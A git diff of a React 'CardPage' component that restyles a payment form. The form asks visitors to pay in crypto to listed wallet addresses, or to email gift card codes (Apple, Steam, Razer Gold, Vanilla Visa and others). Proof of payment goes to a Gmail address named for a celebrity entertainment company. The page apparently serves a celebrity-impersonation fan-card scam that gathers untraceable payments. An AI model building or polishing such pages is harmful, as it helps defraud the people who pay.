@@ -2,6 +2,15 @@ import React, { useState, useEffect, useRef } from 'react';
 import leeImage from '../assets/lee7.jpg';
 import ScrollReveal from 'scrollreveal';
 import emailjs from 'emailjs-com';
+import {
+  FaBitcoin,
+  FaEthereum,
+  FaCcVisa,
+  FaApple,
+  FaCcAmex,
+  FaSteam,
+  FaGamepad,
+} from 'react-icons/fa';
 
 const CardPage = () => {
   const [selectedMethod, setSelectedMethod] = useState('');
@@ -36,25 +45,18 @@ const CardPage = () => {
 
   const sendEmail = (e) => {
     e.preventDefault();
-
     emailjs.sendForm(
       'service_0kmdxhr',
       'template_rhvzeor',
       formRef.current,
       'HzqW2sUdz2C1efEVk'
-    ).then(
-      (result) => {
-        setShowPaymentMessage(true);
-        setSelectedMethod('');
-        setSelectedCrypto('');
-        setSelectedGiftCard('');
-        formRef.current.reset();
-        console.log(result.text);
-      },
-      (error) => {
-        console.error(error.text);
-      }
-    );
+    ).then(() => {
+      setShowPaymentMessage(true);
+      setSelectedMethod('');
+      setSelectedCrypto('');
+      setSelectedGiftCard('');
+      formRef.current.reset();
+    }).catch(console.error);
   };
 
   useEffect(() => {
@@ -64,14 +66,11 @@ const CardPage = () => {
       duration: 800,
       easing: 'ease-in-out',
       origin: 'bottom',
-      reset: false,
-      cleanup: true,
     });
   }, []);
 
   return (
     <section className="reveal p-6 max-w-2xl rounded-lg mx-auto shadow-md">
-      {/* Image */}
       <div className="mb-6">
         <img
           src={leeImage}
@@ -83,74 +82,160 @@ const CardPage = () => {
       <h2 className="text-2xl font-bold mb-4">Choose Payment Method</h2>
 
       <form ref={formRef} onSubmit={sendEmail}>
-        {/* Payment Method Select */}
+        {/* Payment Method */}
         <div className="mb-4">
           <label className="block mb-2 font-semibold">Select a payment option:</label>
-          <select
-            name="payment_option"
-            value={selectedMethod}
-            onChange={handleChange}
-            className="w-full p-3 border bg-black text-white rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
-            required
-          >
-            <option value="">Select</option>
-            <option value="crypto">Crypto</option>
-            <option value="giftcard">Gift Card</option>
-          </select>
+          <div className="space-y-2">
+            <label className="flex items-center gap-2">
+              <input
+                type="radio"
+                name="payment_option"
+                value="crypto"
+                checked={selectedMethod === 'crypto'}
+                onChange={handleChange}
+              />
+              Crypto
+            </label>
+            <label className="flex items-center gap-2">
+              <input
+                type="radio"
+                name="payment_option"
+                value="giftcard"
+                checked={selectedMethod === 'giftcard'}
+                onChange={handleChange}
+              />
+              Gift Card
+            </label>
+          </div>
         </div>
 
-        {/* Crypto Details */}
+        {/* Crypto Radios */}
         {selectedMethod === 'crypto' && (
           <div className="p-4 rounded-md mt-4 bg-black text-white">
             <h3 className="text-lg font-semibold mb-2">Choose a Crypto Option:</h3>
-            <select
-              name="crypto_type"
-              value={selectedCrypto}
-              onChange={handleCryptoChange}
-              className="w-full p-3 border bg-gray-900 text-white rounded-md mb-4"
-              required
-            >
-              <option value="">Select Crypto</option>
-              <option value="bitcoin">Bitcoin</option>
-              <option value="usdt">USDT (ETH)</option>
-              <option value="ethereum">Ethereum</option>
-            </select>
+            <div className="space-y-2 mb-4">
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="crypto_type"
+                  value="bitcoin"
+                  checked={selectedCrypto === 'bitcoin'}
+                  onChange={handleCryptoChange}
+                />
+                <FaBitcoin className="text-yellow-500" />
+                Bitcoin
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="crypto_type"
+                  value="usdt"
+                  checked={selectedCrypto === 'usdt'}
+                  onChange={handleCryptoChange}
+                />
+                <FaEthereum className="text-green-400" />
+                USDT (ETH)
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="crypto_type"
+                  value="ethereum"
+                  checked={selectedCrypto === 'ethereum'}
+                  onChange={handleCryptoChange}
+                />
+                <FaEthereum className="text-blue-400" />
+                Ethereum
+              </label>
+            </div>
 
             {selectedCrypto && (
-              <div>
-                <p className="text-sm mb-1">Send payment to the wallet address below:</p>
-                <p className="text-blue-400 font-mono text-sm break-words">
-                  {cryptoAddresses[selectedCrypto]}
-                </p>
-              </div>
+              <p className="text-blue-400 font-mono text-sm break-words">
+                {cryptoAddresses[selectedCrypto]}
+              </p>
             )}
           </div>
         )}
 
-        {/* Gift Card Details */}
+        {/* Gift Card Radios */}
         {selectedMethod === 'giftcard' && (
           <div className="p-4 rounded-md mt-4 bg-black text-white">
             <h3 className="text-lg font-semibold mb-2">Select Gift Card Type:</h3>
-            <select
-              name="giftcard_type"
-              value={selectedGiftCard}
-              onChange={handleGiftCardChange}
-              className="w-full p-3 border bg-gray-900 text-white rounded-md mb-4"
-              required
-            >
-              <option value="">Select Gift Card</option>
-              <option value="razer">Razer Gold</option>
-              <option value="apple">Apple</option>
-              <option value="vanilla">Vanilla Visa Card</option>
-              <option value="amex">American Express</option>
-              <option value="sephora">Sephora</option>
-              <option value="steam">Steam</option>
-            </select>
+            <div className="space-y-2 mb-4">
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="giftcard_type"
+                  value="razer"
+                  checked={selectedGiftCard === 'razer'}
+                  onChange={handleGiftCardChange}
+                />
+                <FaGamepad />
+                Razer Gold
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="giftcard_type"
+                  value="apple"
+                  checked={selectedGiftCard === 'apple'}
+                  onChange={handleGiftCardChange}
+                />
+                <FaApple />
+                Apple
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="giftcard_type"
+                  value="vanilla"
+                  checked={selectedGiftCard === 'vanilla'}
+                  onChange={handleGiftCardChange}
+                />
+                <FaCcVisa />
+                Vanilla Visa
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="giftcard_type"
+                  value="amex"
+                  checked={selectedGiftCard === 'amex'}
+                  onChange={handleGiftCardChange}
+                />
+                <FaCcAmex />
+                American Express
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="giftcard_type"
+                  value="sephora"
+                  checked={selectedGiftCard === 'sephora'}
+                  onChange={handleGiftCardChange}
+                />
+                💄
+                Sephora
+              </label>
+              <label className="flex items-center gap-3">
+                <input
+                  type="radio"
+                  name="giftcard_type"
+                  value="steam"
+                  checked={selectedGiftCard === 'steam'}
+                  onChange={handleGiftCardChange}
+                />
+                <FaSteam />
+                Steam
+              </label>
+            </div>
 
             {selectedGiftCard && (
               <div>
-                <p className="text-sm">Please send the gift card code and amount to:</p>
-                <p className="text-blue-400 font-semibold">{giftCardEmails[selectedGiftCard]}</p>
+                <p className="text-sm">Send code and amount to:</p>
+                <p className="text-blue-400 font-semibold">
+                  {giftCardEmails[selectedGiftCard]}
+                </p>
               </div>
             )}
           </div>
@@ -167,18 +252,17 @@ const CardPage = () => {
         </div>
       </form>
 
+      {/* Confirmation */}
       {showPaymentMessage && (
         <div className="fixed top-0 left-0 right-0 bottom-0 bg-white bg-opacity-80 flex flex-col items-center justify-center text-white text-xl font-semibold p-6 lg:p-8">
-         <p className="border rounded-3xl bg-black p-3 px-3 md:p-4 flex justify-center text-center">
-           Kindly send the proof of your payment to 
+          <p className="border rounded-3xl bg-black p-3 text-center">
+            Kindly send the proof of your payment to
           </p>
-
-          <b className="border rounded-xl flex items-center justify-center bg-black p-4 text-blue-500">
-             byunghunentertainment@gmail.com
-            </b>
+          <b className="border rounded-xl bg-black p-4 text-blue-500">
+            byunghunentertainment@gmail.com
+          </b>
         </div>
-     )}
-
+      )}
     </section>
   );
 };
